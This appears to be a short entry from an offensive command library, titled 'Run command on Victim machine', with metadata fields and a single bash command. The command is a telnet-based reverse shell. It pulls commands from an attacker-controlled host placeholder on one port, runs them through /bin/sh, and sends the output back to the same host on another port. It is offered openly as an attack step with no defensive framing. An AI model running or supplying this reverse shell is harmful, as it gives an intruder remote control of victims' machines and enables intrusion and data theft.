---
id: 41543d18-3209-40fe-8835-3cd9b2165f9f
name: Run command on Victim machine
type: command
executor: bash
data: telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
output: null
created_at: '2023-04-06T03:56:24.592556+00:00'
updated_at: '2023-04-10T20:25:31.686351+00:00'
---

# Run command on Victim machine

```bash
telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
```
